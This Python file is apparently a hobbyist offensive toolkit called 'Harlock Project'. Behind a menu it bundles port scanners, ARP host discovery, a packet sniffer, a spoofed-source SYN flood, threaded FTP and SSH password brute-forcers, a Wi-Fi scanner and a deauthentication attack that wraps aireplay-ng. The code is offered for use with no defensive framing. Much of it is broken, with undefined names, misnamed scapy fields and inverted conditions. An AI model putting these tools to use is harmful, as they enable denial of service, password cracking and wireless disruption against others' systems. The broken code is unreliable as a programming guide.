#!/usr/bin/python3
# -*- coding: utf-8  -*-
#

from time import sleep
import time
import datetime
from datetime import datetime, date
import os
import re
import sys
from colorama import Fore, Back, Style
import terminaltables
from socket import *
import random
from scapy.all import *
from threading import Thread
import pandas
from gif_for_cli.execute import execute

# currentdate = date.today()
# currentdate = currentdate.strftime('%d:%m:%y ')
# current = datetime.now()
# current_time = current.strftime("%H:%M:%S")
#
#
# currentdirectory = os.getcwd()
# dirlist = os.listdir(currentdirectory)
def template():
    try:
        execute(os.environ, ["https://tenor.com/view/captain-harlock-harlock-wave-see-yah-gif-14033135"], sys.stdout)
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        os.system('cls' if os.name == 'nt' else 'clear')

    # os.sys("gif-for-cli --rows 25 --cols 100 14033135")
    print("""
    __  __           __           __      ____               _           __
   / / / /___ ______/ /___  _____/ /__   / __ \_________    (_)__  _____/ /_
  / /_/ / __ `/ ___/ / __ \/ ___/ //_/  / /_/ / ___/ __ \  / / _ \/ ___/ __/
 / __  / /_/ / /  / / /_/ / /__/ ,<    / ____/ /  / /_/ / / /  __/ /__/ /_
/_/ /_/\__,_/_/  /_/\____/\___/_/|_|  /_/   /_/   \____/_/ /\___/\___/\__/
                                                      /___/

    """)
    pass


def portscanner():

    startTime = time.time()
    if __name__ == '__main__':
        target = input('Target IP to scanned: ')
        t_IP = gethostbyname(target)
        print ('Starting scan on host: ', t_IP)

        for i in range(50, 500):
             s = socket(AF_INET, SOCK_STREAM)
             conn = s.connect_ex((t_IP, i))
             if(conn == 0) :
                 print ('Port %d: OPEN' % (i,))
             s.close()
             print('Time taken:', time.time() - startTime)

def alive_network_hosts_1():
    import socket
    import time
    import threading

    from queue import Queue
    socket.setdefaulttimeout(0.25)
    print_lock = threading.Lock()

    target = input('Enter the host to be scanned: ')
    t_IP = socket.gethostbyname(target)
    print ('Starting scan on host: ', t_IP)

    def portscan(port):
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
          con = s.connect((t_IP, port))
          with print_lock:
             print(port, 'is open')
          con.close()
       except:
          pass

    def threader():
       while True:
          worker = q.get()
          portscan(worker)
          q.task_done()
          q = Queue()
          startTime = time.time()

    for x in range(100):
       t = threading.Thread(target = threader)
       t.daemon = True
       t.start()

    for worker in range(1, 500):
       q.put(worker)

    q.join()
    print('Time taken:', time.time() - startTime)

def alive_network_hosts_2():
    from scapy.all import ARP, Ether, srp

    target_ip = "192.168.1.1/24"
    # IP Address for the destination
    # create ARP packet
    arp = ARP(pdst=target_ip)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack them
    packet = ether/arp

    result = srp(packet, timeout=3, verbose=0)[0]

    # a list of clients, we will fill this in the upcoming loop
    clients = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    # print clients
    print("Available devices in the network:")
    print("IP" + " "*18+"MAC")
    for client in clients:
        print("{:16}    {}".format(client['ip'], client['mac']))

def sniffer():
    import socket
    import struct
    import binascii
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket. htons(0x0800))
    while True:
        packet = s.recvfrom(2048)
    ethernet_header = packet[0][0:14]
    eth_header = struct.unpack("!6s6s2s", ethernet_header)
    print ("Destination MAC:" + binascii.hexlify(eth_header[0]) + " Source MAC:" + binascii.hexlify(eth_header[1]) + " Type:" + binascii.hexlify(eth_header[2]))
    ipheader = pkt[0][14:34]
    ip_header = struct.unpack("!12s4s4s", ipheader)
    print ("Source IP:" + socket.inet_ntoa(ip_header[1]) + " Destination IP:" + socket.inet_ntoa(ip_header[2]))

def DOS():
    #Multiple IP multiple port

    target_IP = input("Enter IP address of Target: ")
    i = 1

    while True:
       a = str(random.randint(1,254))
       b = str(random.randint(1,254))
       c = str(random.randint(1,254))
       d = str(random.randint(1,254))
       dot = "."
       Source_ip = a + dot + b + dot + c + dot + d

       for source_port in range(1, 65535):
          IP1 = IP(source_IP = source_IP, destination = target_IP)
          TCP1 = TCP(srcport = source_port, dstport = 80)
          pkt = IP1 / TCP1
          send(pkt,inter = .001)

          print ("packet sent ", i)
          i = i + 1

def ftp_bruteforcer():
    import ftplib
    from threading import Thread
    import queue
    from colorama import Fore, init # for fancy colors, nothing else

    # init the console for colors (for Windows)
    # init()
    # initialize the queue
    q = queue.Queue()
    # number of threads to spawn
    n_threads = 30
    # hostname or IP address of the FTP server

    host = input('Enter the host IP: ')
    # username of the FTP server, root as default for linux
    user = input('Username to test: ')
    # port of FTP, aka 21
    port = 21

    def connect_ftp():
        global q
        while True:
            # get the password from the queue
            password = q.get()
            # initialize the FTP server object
            server = ftplib.FTP()
            print("[!] Trying", password)
            try:
                # tries to connect to FTP server with a timeout of 5
                server.connect(host, port, timeout=5)
                # login using the credentials (user & password)
                server.login(user, password)
            except ftplib.error_perm:
                # login failed, wrong credentials
                pass
            else:
                # correct credentials
                print(f"{Fore.GREEN}[+] Found credentials: ")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f"\tPassword: {password}{Fore.RESET}")
                # we found the password, let's clear the queue
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
            finally:
                # notify the queue that the task is completed for this password
                q.task_done()

    # read the wordlist of passwords
    wordlist_ftp = input('Wordlist to use (path): ')
    passwords = open(wordlist_ftp).read().split("\n")
    print("[+] Passwords to try:", len(passwords))
    # put all passwords to the queue
    for password in passwords:
        q.put(password)
    # create `n_threads` that runs that function
    for t in range(n_threads):
        thread = Thread(target=connect_ftp)
        # will end when the main thread end
        thread.daemon = True
        thread.start()
    # wait for the queue to be empty
    q.join()

def ssh_bruteforcer():
    import argparse
    host = input('Target IP: ')
    passlist = input('Wordlist to use: ')
    user = input('Username to test: ')
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            print("Found Valid Combo as :", user, "with password", password)
            print("Writing it in credentials.txt")
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break

def wifi_scanner():


    # initialize the networks dataframe that will contain all access points nearby
    networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
    # set the index BSSID (MAC address of the AP)
    networks.set_index("BSSID", inplace=True)

    def callback(packet):
        if packet.haslayer(Dot11Beacon):
            # extract the MAC address of the network
            bssid = packet[Dot11].addr2
            # get the name of it
            ssid = packet[Dot11Elt].info.decode()
            try:
                dbm_signal = packet.dBm_AntSignal
            except:
                dbm_signal = "N/A"
            # extract network stats
            stats = packet[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")
            # get the crypto
            crypto = stats.get("crypto")
            networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


    def print_all():
        while True:
            os.system("clear")
            print(networks)
            time.sleep(0.5)


    def change_channel():
        ch = 1
        while True:
            os.system(f"iwconfig {interface} channel {ch}")
            # switch channel from 1 to 14 each 0.5s
            ch = ch % 14 + 1
            time.sleep(0.5)


    if __name__ == "__main__":
        # interface name, check using iwconfig

        interface = input("choose interface: ")
        # start the thread that prints all the networks
        printer = Thread(target=print_all)
        printer.daemon = True
        printer.start()
        # start the channel changer
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        # start sniffing
        sniff(prn=callback, iface=interface)
        raw= input()

def wifi_deauther() :
    interface = input("interface to use: ")
    ##recon
    if interface:
        print("interface not set !")
    else:
        print("set interface", interface, "in monitor mode...")
        os.sys("airmon-ng start", interface)
        print("starting recon...")
        os.sys("airodump-ng", interface)
        target = input("Target MAC address: ")
        packets = input("Packet to send (def 999): ")
        if packets:
            # -D mean "disable AP detection"
            packets = "999"
            os.sys("aireplay-ng -D -0", packets,"-a", target, interface)
        else:
            os.sys("aireplay-ng -D -0", packets,"-a", target, interface)




if __name__ == '__main__':
    def menu():
        template()
        #time.sleep(1)
        print()

        choice = input("""
                          1: Install Dependencies
                          2: Starting Arcadia Protocol (Spec Recon)
                          3: J'adore C'est Trop Bieng !!!!!!!!!!!!!!!!!!!!!!!!
                          4: Wifi Arsenal
                          5: Bruteforcer
                          00: Quit/Log Out

                          Please enter your choice: """)

        if choice =="1":
            enterstudentdetails()
        elif choice =="2":
            viewstudentdetails()
        elif choice =="3":
            print("test")
        elif choice=="4":
            choice = input("""
                              1: Wifi Scanner
                              2: Wifi Deauther

                              b: back
                              00: Quit/Log Out

                              Please enter your choice: """)

            if choice =="1":
                wifi_scanner()
            elif choice =="2":
                wifi_deauther()
            elif choice == "b":
                menu()
            elif choice == "00":
                sys.exit

        elif choice=="5":
            choice = input("""
                              1: SSH Bruteforcer
                              2: FTP Bruteforcer

                              b: back
                              00: Quit/Log Out

                              Please enter your choice: """)

            if choice =="1":
                ssh_bruteforcer()
            elif choice =="2":
                ftp_bruteforcer()
            elif choice == "b":
                menu()
            elif choice == "00":
                sys.exit

        elif choice=="00":
            sys.exit
        else:
            print("Selection: ")
            print("Please try again")
            menu()
    menu()

####CODE template
# from terminaltables import AsciiTable
# table_data = [
#     ['Heading1', 'Heading2'],
#     ['row1 column1', 'row1 column2'],
#     ['row2 column1', 'row2 column2'],
#     ['row3 column1', 'row3 column2']
# ]
# table = AsciiTable(table_data)
# print table.table
# +--------------+--------------+
# | Heading1     | Heading2     |
# +--------------+--------------+
# | row1 column1 | row1 column2 |
# | row2 column1 | row2 column2 |
# | row3 column1 | row3 column2 |
# +--------------+--------------+
